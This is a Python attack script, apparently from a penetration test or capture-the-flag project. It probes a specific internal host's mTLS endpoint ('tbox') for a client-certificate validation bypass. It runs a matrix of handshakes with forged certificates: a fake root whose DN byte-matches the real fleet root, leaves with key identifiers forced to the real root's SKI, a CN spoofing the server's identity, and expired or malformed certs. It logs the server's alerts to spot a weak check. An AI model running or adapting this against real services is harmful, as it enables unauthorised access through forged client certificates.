#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Round-3 client-cert matrix: the "naive validation" bypass surface.

Round-1 (0005) and round-2 (0103) used DNs built by `cryptography`, which encodes
every string as UTF8String (tag 0x0C). The real root DN is a **PrintableString**
(tag 0x13):

    30 25 31 23 30 21 06 03 55 04 03 13 1a "CV6 Fleet Diagnostics Root"

So a "same DN" forgery built with a UTF8String is NOT the same bytes, and a
server that compares raw DN bytes (or `x509.Name` equality) would reject it for
a reason that has nothing to do with the hypothesis under test. This matrix uses
`string_mask = pkix` material (mat2w/) whose issuer/subject DN is byte-identical
to the real root DN, so the "DN-only compare" hypothesis is tested fairly.

Usage: python 04_SOLVE/tbox/mtls_matrix3.py            # writes JSON to stdout
       python 04_SOLVE/tbox/mtls_matrix3.py --json f   # ... and to a file
"""
import argparse
import json
import os
import socket
import ssl
import sys
import time

HOST, PORT, SNI = "10.230.164.3", 8443, "tbox"
MAT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mat2w")
MAT1 = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mat")

ALERTS = {40: "handshake_failure", 42: "bad_certificate", 43: "unsupported_certificate",
          45: "certificate_expired", 46: "certificate_unknown", 47: "illegal_parameter",
          48: "unknown_ca", 49: "access_denied", 50: "decode_error",
          70: "protocol_version", 116: "certificate_required"}


def classify(exc):
    txt = str(exc)
    for num, nm in ALERTS.items():
        if nm.replace("_", " ") in txt.lower():
            return num, nm
    return None, txt.split("(")[0].strip()


def attempt(cert, key, tls13=True, path=None):
    """One handshake (+optional request). Returns a dict of facts."""
    rec = {"cert": os.path.basename(cert) if cert else None,
           "key": os.path.basename(key) if key else None}
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if tls13:
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    else:
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.maximum_version = ssl.TLSVersion.TLSv1_2
    if cert:
        try:
            ctx.load_cert_chain(cert, key)
        except Exception as e:
            rec["local_error"] = "%s: %s" % (type(e).__name__, e)
            return rec
    try:
        raw = socket.create_connection((HOST, PORT), 8)
        raw.settimeout(8)
        tls = ctx.wrap_socket(raw, server_hostname=SNI)
    except ssl.SSLError as e:
        num, nm = classify(e)
        rec.update({"handshake": "FAIL", "alert": num, "alert_name": nm, "raw_error": str(e)})
        return rec
    except OSError as e:
        rec.update({"handshake": "CONNECT-ERROR", "raw_error": str(e)})
        return rec
    try:
        rec.update({"handshake": "OK", "tls": tls.version(),
                    "cipher": tls.cipher()[0] if tls.cipher() else None,
                    "alpn": tls.selected_alpn_protocol()})
        # IMPORTANT: in TLS1.3 the client-side handshake "succeeds" before the
        # server has judged the client certificate; the fatal alert (116/48/45)
        # only surfaces on the first read. Always read, even without a request.
        if path:
            tls.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"
                         % (path, SNI)).encode())
        buf = b""
        tls.settimeout(8)
        while True:
            try:
                d = tls.recv(65536)
            except socket.timeout:
                rec["read_timeout"] = True
                break
            except ssl.SSLError as e:
                num, nm = classify(e)
                rec.update({"io_error": str(e), "io_alert": num, "io_alert_name": nm})
                break
            except (ConnectionResetError, ConnectionAbortedError, OSError) as e:
                # no alert, just a RST/close: itself a discriminating observation
                rec.update({"io_error": "%s: %s" % (type(e).__name__, e), "io_alert": None,
                            "io_alert_name": "TCP-RST/no-alert"})
                break
            if not d:
                break
            buf += d
            if len(buf) > 262144:
                break
        if buf:
            rec["response_head"] = buf.split(b"\r\n")[0].decode("latin1", "replace")
            rec["response_len"] = len(buf)
            rec["response_preview"] = buf[:600].decode("utf-8", "replace")
    except ssl.SSLError as e:
        num, nm = classify(e)
        rec.update({"io_error": str(e), "io_alert": num, "io_alert_name": nm})
    finally:
        try:
            tls.close()
            raw.close()
        except Exception:
            pass
    return rec


def p(*parts):
    return os.path.join(*parts)


VECTORS = [
    # (tag, cert, key, note)
    ("A0_no_cert", None, None, "baseline: no client cert -> expect 116"),
    ("A1_w1_leaf_only", p(MAT, "w1_leaf.pem"), p(MAT, "w1_leaf.key"),
     "forged root CA (DN byte-identical to real root), leaf only"),
    ("A2_w1_leaf_plus_chain", p(MAT, "w1_leaf_chain.pem"), p(MAT, "w1_leaf.key"),
     "leaf + forged root in the chain"),
    ("A3_w2_leaf_aki_real", p(MAT, "w2_leaf_aki.pem"), p(MAT, "w2_leaf_aki.key"),
     "leaf with AKI forced to the real root SKI, leaf only"),
    ("A4_w3_leaf_ski_ca", p(MAT, "w3_leaf_skica.pem"), p(MAT, "w3_leaf_skica.key"),
     "leaf (AKI=real root SKI) + forged CA whose SKI=real root SKI"),
    ("A5_w3_leaf_ski_ca_chain", p(MAT, "w3_leaf_skica_chain.pem"), p(MAT, "w3_leaf_skica.key"),
     "same as A4 with the CA in the chain"),
    ("A6_w4_leaf_cn_tbox", p(MAT, "w4_leaf_cn_tbox.pem"), p(MAT, "w4_leaf_cn_tbox.key"),
     "forged-CA leaf whose CN is 'tbox' (server identity)"),
    ("A7_w9_root_named_ski", p(MAT, "w9_root_named_ski.pem"), p(MAT, "w9_root_named_ski.key"),
     "self-signed cert NAMED like the root, SKI=real root SKI (UTF8String DN: control)"),
    ("A8_w5_empty_subject", p(MAT, "w5_empty_subject.pem"), p(MAT, "w5_empty_subject.key"),
     "empty subject DN, SAN DNS:tbox"),
    ("A9_w6_long_cn", p(MAT, "w6_long_cn.pem"), p(MAT, "w6_long_cn.key"),
     "200-char CN (RFC5280 caps 64)"),
    ("B1_w7_future", p(MAT, "w7_future.pem"), p(MAT, "w7_future.key"),
     "not-yet-valid (NotBefore 2030)"),
    ("B2_w8_expired", p(MAT, "w8_expired.pem"), p(MAT, "w8_expired.key"),
     "expired self-signed -> discriminates 'real verify' from 'a cert exists'"),
    ("B3_vpncert", p(MAT1, "..", "..", "..", "01_TARGETS", "tbox", "vpn_client.pem"),
     p(MAT1, "..", "..", "..", "01_TARGETS", "tbox", "vpn_client.key"),
     "OVPN client cert (VPN CA) - already known: 48"),
]

TLS12_VECTORS = [
    ("C1_tls12_no_cert", None, None, "TLS1.2 offer without cert"),
    ("C2_tls12_with_cert", p(MAT, "w1_leaf.pem"), p(MAT, "w1_leaf.key"),
     "TLS1.2 offer with a client cert present"),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--json", default=None)
    args = ap.parse_args()
    out = []
    print("## mtls_matrix3  %s:%d  SNI=%s  TLS1.3 forced" % (HOST, PORT, SNI))
    print("## material dir: 04_SOLVE/tbox/mat2w (PrintableString DN = byte-identical to real root)")
    for tag, cert, key, note in VECTORS:
        if cert and not os.path.exists(cert):
            print("!! missing", cert)
            continue
        rec = attempt(cert, key)
        rec.update({"tag": tag, "note": note})
        out.append(rec)
        print(json.dumps(rec, ensure_ascii=False))
        time.sleep(0.4)
    print("## TLS1.2 branch")
    for tag, cert, key, note in TLS12_VECTORS:
        rec = attempt(cert, key, tls13=False)
        rec.update({"tag": tag, "note": note})
        out.append(rec)
        print(json.dumps(rec, ensure_ascii=False))
        time.sleep(0.4)
    if args.json:
        json.dump(out, open(args.json, "w", encoding="utf-8"), indent=1)
        print("## wrote", args.json, len(out), "records")
    return 0


if __name__ == "__main__":
    sys.exit(main())
